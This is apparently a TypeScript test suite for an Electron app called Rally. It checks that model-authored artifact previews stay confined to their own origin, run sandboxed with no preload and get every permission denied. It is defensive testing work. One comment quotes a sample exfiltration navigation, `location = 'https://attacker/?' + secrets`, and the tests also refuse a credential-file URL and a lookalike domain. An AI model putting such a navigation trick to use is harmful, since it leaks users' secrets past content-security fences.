import { describe, expect, it, vi } from 'vitest';

import {
  ArtifactPreviewController,
  applyGlobalNavigationPolicy,
  artifactPartition,
  artifactWebPreferences,
  clampBounds,
  confineToArtifactOrigin,
  isArtifactUrl,
  type PreviewBounds,
} from './artifact-viewers';

describe('the global navigation fence handoff', () => {
  it('defers artifact navigation before preventing it', () => {
    const preventDefault = vi.fn();
    const openExternal = vi.fn();
    applyGlobalNavigationPolicy({
      event: { preventDefault },
      url: `${ORIGIN}/__rally/redeem`,
      artifactSurface: true,
      rendererAllowed: () => false,
      externalAllowed: () => true,
      openExternal,
    });

    expect(preventDefault).not.toHaveBeenCalled();
    expect(openExternal).not.toHaveBeenCalled();
  });

  it('still blocks and hands an ordinary external navigation to the browser', () => {
    const preventDefault = vi.fn();
    const openExternal = vi.fn();
    applyGlobalNavigationPolicy({
      event: { preventDefault },
      url: 'https://example.test/',
      artifactSurface: false,
      rendererAllowed: () => false,
      externalAllowed: () => true,
      openExternal,
    });

    expect(preventDefault).toHaveBeenCalledOnce();
    expect(openExternal).toHaveBeenCalledWith('https://example.test/');
  });
});

const DOMAIN = 'rallyusercontent.test';
const ARTIFACT = '3f2504e0-4f89-41d3-9a0c-0305e82c3301';
const ORIGIN = `https://${ARTIFACT}-g.${DOMAIN}`;

describe('what the main process will load into an artifact surface', () => {
  it('accepts an artifact origin on the serving domain', () => {
    expect(isArtifactUrl(`${ORIGIN}/`, DOMAIN)).toBe(true);
    expect(isArtifactUrl(`${ORIGIN}/__rally/open#code`, DOMAIN)).toBe(true);
  });

  it('refuses a lookalike domain that merely contains the serving domain', () => {
    // Matched on a label boundary, so a suffix attack does not pass.
    expect(isArtifactUrl(`https://${DOMAIN}.evil.test/`, DOMAIN)).toBe(false);
    expect(isArtifactUrl(`https://not${DOMAIN}/`, DOMAIN)).toBe(false);
  });

  it('refuses the application, the API, and anything not https', () => {
    // This function is the whole capability the renderer does not get: pointing
    // an artifact surface at Rally's own origin would put model-authored code
    // where the app's cookies are.
    expect(isArtifactUrl('https://rallywith.ai/app', DOMAIN)).toBe(false);
    expect(isArtifactUrl('https://api.rallywith.ai/', DOMAIN)).toBe(false);
    expect(isArtifactUrl(`http://${ARTIFACT}-g.${DOMAIN}/`, DOMAIN)).toBe(false);
    expect(isArtifactUrl(`file:///etc/passwd`, DOMAIN)).toBe(false);
    expect(isArtifactUrl('app://rallywithai/index.html', DOMAIN)).toBe(false);
    expect(isArtifactUrl('not a url', DOMAIN)).toBe(false);
  });
});

describe('the preview rectangle', () => {
  const window = { width: 1_200, height: 800 };

  it('passes a rectangle that already fits', () => {
    expect(clampBounds({ x: 900, y: 100, width: 280, height: 400 }, window))
      .toEqual({ x: 900, y: 100, width: 280, height: 400 });
  });

  it('clamps a rectangle that would cover the whole window', () => {
    // The renderer measures this, so it is a request rather than an
    // instruction: a wrong one must not paint artifact content over the chrome
    // a person needs to escape it.
    expect(clampBounds({ x: 900, y: 100, width: 5_000, height: 5_000 }, window))
      .toEqual({ x: 900, y: 100, width: 300, height: 700 });
  });

  it('clamps negative and out-of-window origins', () => {
    expect(clampBounds({ x: -50, y: -50, width: 100, height: 100 }, window))
      .toEqual({ x: 0, y: 0, width: 100, height: 100 });
    expect(clampBounds({ x: 9_000, y: 9_000, width: 100, height: 100 }, window))
      .toEqual({ x: 1_200, y: 800, width: 0, height: 0 });
  });

  it('rounds rather than passing fractional pixels through', () => {
    expect(clampBounds({ x: 10.4, y: 10.6, width: 100.5, height: 100.4 }, window))
      .toEqual({ x: 10, y: 11, width: 101, height: 100 });
  });
});

describe('the isolation contract both surfaces share', () => {
  it('gives artifact content no preload, no Node, and a sandbox', () => {
    const preferences = artifactWebPreferences(ARTIFACT, true);
    // A preload is a capability, and model-authored content is the last content
    // that should hold one.
    expect(preferences).not.toHaveProperty('preload');
    expect(preferences.nodeIntegration).toBe(false);
    expect(preferences.sandbox).toBe(true);
    expect(preferences.contextIsolation).toBe(true);
    expect(preferences.webSecurity).toBe(true);
    expect(preferences.allowRunningInsecureContent).toBe(false);
  });

  it('closes DevTools outside development', () => {
    expect(artifactWebPreferences(ARTIFACT, true).devTools).toBe(false);
    expect(artifactWebPreferences(ARTIFACT, false).devTools).toBe(true);
  });

  it('partitions per artifact, and shares that partition between both surfaces', () => {
    // Per artifact so one cannot read another's storage; shared between the
    // rail preview and the pop-out so a person authorizes once.
    expect(artifactPartition(ARTIFACT)).toBe(`persist:artifact-${ARTIFACT}`);
    expect(artifactPartition(ARTIFACT)).not.toBe(artifactPartition('other'));
    expect(artifactWebPreferences(ARTIFACT, true).partition).toBe(artifactPartition(ARTIFACT));
  });
});

describe('confining a surface to its artifact', () => {
  function contents() {
    const handlers: { navigate?: (event: { preventDefault(): void }, url: string) => void } = {};
    let windowOpen: ((details: { url: string }) => { action: 'deny' }) | null = null;
    let permission: ((c: unknown, p: string, cb: (allowed: boolean) => void) => void) | null = null;
    return {
      handlers,
      openWindow: (url: string) => windowOpen?.({ url }),
      requestPermission: (name: string) => {
        const answers: boolean[] = [];
        permission?.(null, name, (allowed) => answers.push(allowed));
        return answers;
      },
      stub: {
        on(_event: 'will-navigate', handler: (event: { preventDefault(): void }, url: string) => void) {
          handlers.navigate = handler;
        },
        setWindowOpenHandler(handler: (details: { url: string }) => { action: 'deny' }) {
          windowOpen = handler;
        },
        session: {
          setPermissionRequestHandler(
            handler: (c: unknown, p: string, cb: (allowed: boolean) => void) => void,
          ) {
            permission = handler;
          },
        },
      },
    };
  }

  it('lets the artifact navigate within its own origin', () => {
    const surface = contents();
    confineToArtifactOrigin(surface.stub as never, ORIGIN);
    const event = { preventDefault: vi.fn() };
    surface.handlers.navigate?.(event, `${ORIGIN}/about`);
    expect(event.preventDefault).not.toHaveBeenCalled();
  });

  it('refuses an off-origin navigation and hands it to nobody', () => {
    // A URL an artifact composes is a URL model-authored code chose, and
    // `location = "https://attacker/?" + secrets` is a navigation the CSP's
    // connect-src and form-action do not touch. Opening it externally would
    // make Rally perform the exfiltration the egress fence exists to prevent.
    const surface = contents();
    confineToArtifactOrigin(surface.stub as never, ORIGIN);
    for (const url of ['https://example.com/docs', `https://other-g.${DOMAIN}/`, 'https://rallywith.ai/app']) {
      const event = { preventDefault: vi.fn() };
      surface.handlers.navigate?.(event, url);
      expect(event.preventDefault, url).toHaveBeenCalled();
    }
  });

  it('denies window.open outright rather than redirecting it anywhere', () => {
    const surface = contents();
    confineToArtifactOrigin(surface.stub as never, ORIGIN);
    expect(surface.openWindow('https://example.com')).toEqual({ action: 'deny' });
  });

  it('denies every permission request outright', () => {
    // A camera prompt that appears to come from Rally is worse than one that
    // never appears.
    const surface = contents();
    confineToArtifactOrigin(surface.stub as never, ORIGIN);
    for (const permission of ['media', 'geolocation', 'notifications', 'clipboard-read']) {
      expect(surface.requestPermission(permission), permission).toEqual([false]);
    }
  });
});

describe('the rail preview controller', () => {
  function harness(servingDomain = DOMAIN, loadFailure: Error | null = null) {
    const views: {
      url: string | null;
      bounds: PreviewBounds[];
      closed: boolean;
    }[] = [];
    const removed: unknown[] = [];
    const controller = new ArtifactPreviewController(
      {
        contentSize: () => ({ width: 1_200, height: 800 }),
        removeView: (view) => removed.push(view),
      },
      servingDomain,
      () => {
        const state = { url: null as string | null, bounds: [] as PreviewBounds[], closed: false };
        views.push(state);
        return {
          setBounds: (bounds: PreviewBounds) => state.bounds.push(bounds),
          loadURL: async (url: string) => {
            state.url = url;
            if (loadFailure) throw loadFailure;
          },
          close: () => { state.closed = true; },
        };
      },
    );
    return { controller, views, removed };
  }

  const bounds = { x: 900, y: 100, width: 280, height: 400 };

  it('presents an artifact and positions it over the rail', async () => {
    const { controller, views } = harness();
    expect(await controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds })).toBe(true);
    expect(views).toHaveLength(1);
    expect(views[0]?.url).toBe(`${ORIGIN}/`);
    expect(views[0]?.bounds.at(-1)).toEqual(bounds);
  });

  it('refuses a URL that is not an artifact, and creates nothing', async () => {
    const { controller, views } = harness();
    expect(await controller.present({ artifactId: ARTIFACT, url: 'https://rallywith.ai/app', bounds })).toBe(false);
    expect(views).toHaveLength(0);
    expect(controller.currentArtifactId()).toBeNull();
  });

  it('reports a failed navigation and removes the empty composited view', async () => {
    const { controller, views, removed } = harness(DOMAIN, new Error('ERR_NAME_NOT_RESOLVED'));
    expect(await controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds })).toBe(false);
    expect(views[0]?.closed).toBe(true);
    expect(removed).toHaveLength(1);
    expect(controller.currentArtifactId()).toBeNull();
  });

  it('keeps at most one view per window, reusing it for the same artifact', () => {
    // Two would mean two artifacts painting over one rectangle, and the one
    // underneath would still be running.
    const { controller, views } = harness();
    controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds });
    controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds });
    expect(views).toHaveLength(1);
    expect(views[0]?.closed).toBe(false);
  });

  it('replaces the view when the artifact changes', () => {
    const { controller, views, removed } = harness();
    controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds });
    controller.present({ artifactId: 'other', url: `https://other-g.${DOMAIN}/`, bounds });
    expect(views).toHaveLength(2);
    expect(views[0]?.closed).toBe(true);
    expect(removed).toHaveLength(1);
    expect(controller.currentArtifactId()).toBe('other');
  });

  it('collapses to nothing while an app overlay is open, and restores after', () => {
    // A WebContentsView composites above the renderer's DOM, so a dialog or the
    // command palette would otherwise be painted over by artifact content.
    const { controller, views } = harness();
    controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds });
    controller.setOverlayOpen(true);
    expect(views[0]?.bounds.at(-1)).toEqual({ x: 0, y: 0, width: 0, height: 0 });
    controller.setOverlayOpen(false);
    expect(views[0]?.bounds.at(-1)).toEqual(bounds);
    // Collapsed rather than destroyed: the page keeps its state, so closing a
    // dialog restores what the person was looking at.
    expect(views[0]?.closed).toBe(false);
    expect(views).toHaveLength(1);
  });

  it('stays hidden through a layout change while an overlay is open', () => {
    const { controller, views } = harness();
    controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds });
    controller.setOverlayOpen(true);
    controller.setBounds({ x: 500, y: 50, width: 400, height: 500 });
    expect(views[0]?.bounds.at(-1)).toEqual({ x: 0, y: 0, width: 0, height: 0 });
  });

  it('clamps a layout update to the window', () => {
    const { controller, views } = harness();
    controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds });
    controller.setBounds({ x: 900, y: 100, width: 9_000, height: 9_000 });
    expect(views[0]?.bounds.at(-1)).toEqual({ x: 900, y: 100, width: 300, height: 700 });
  });

  it('destroys the view and forgets the artifact', () => {
    const { controller, views, removed } = harness();
    controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds });
    controller.destroy();
    expect(views[0]?.closed).toBe(true);
    expect(removed).toHaveLength(1);
    expect(controller.currentArtifactId()).toBeNull();
    // Idempotent: a second close must not remove a view twice.
    controller.destroy();
    expect(removed).toHaveLength(1);
  });
});
